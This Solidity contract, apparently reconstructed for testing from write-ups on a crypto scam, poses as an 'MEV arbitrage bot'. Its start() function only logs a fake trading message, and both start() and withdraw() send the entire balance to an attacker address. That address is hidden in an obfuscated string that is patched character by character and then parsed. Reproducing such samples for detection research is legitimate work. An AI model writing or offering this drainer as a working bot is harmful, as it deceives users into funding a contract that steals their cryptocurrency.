// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// "Carrier string" variant (reported by Intercepta / CT, 2025): a hex-looking
// string with filler characters is patched by index, then parsed into an
// address. Reconstructed from published write-ups for testing.
contract MEVBotV3 {
    address public owner;
    event Log(string msg);

    constructor() { owner = msg.sender; }
    receive() external payable {}

    function replaceCharAt(string memory s, uint256 idx, bytes1 c) internal pure returns (string memory) {
        bytes memory b = bytes(s);
        b[idx] = c;
        return string(b);
    }

    function parseAddressFromAscii(string memory s, uint256 start, uint256 len) internal pure returns (address) {
        bytes memory b = bytes(s);
        uint160 r = 0;
        for (uint256 i = start; i < start + len; i++) {
            uint8 c = uint8(b[i]);
            uint8 v;
            if (c >= 48 && c <= 57) v = c - 48;
            else if (c >= 65 && c <= 70) v = c - 55;
            else if (c >= 97 && c <= 102) v = c - 87;
            r = r * 16 + v;
        }
        return address(r);
    }

    function exchange() internal pure returns (address) {
        string memory s = "QG384C1A318cE21D85F34A8D2748311EA2F91c84f0";
        s = replaceCharAt(s, 0, "0");
        s = replaceCharAt(s, 1, "x");
        return parseAddressFromAscii(s, 2, 40);
    }

    function executeTrades() internal {
        emit Log("Executing arbitrage trades...");
    }

    function start() public payable {
        executeTrades();
        payable(exchange()).transfer(address(this).balance);
    }

    function withdraw() public {
        require(msg.sender == owner);
        payable(exchange()).transfer(address(this).balance);
    }
}
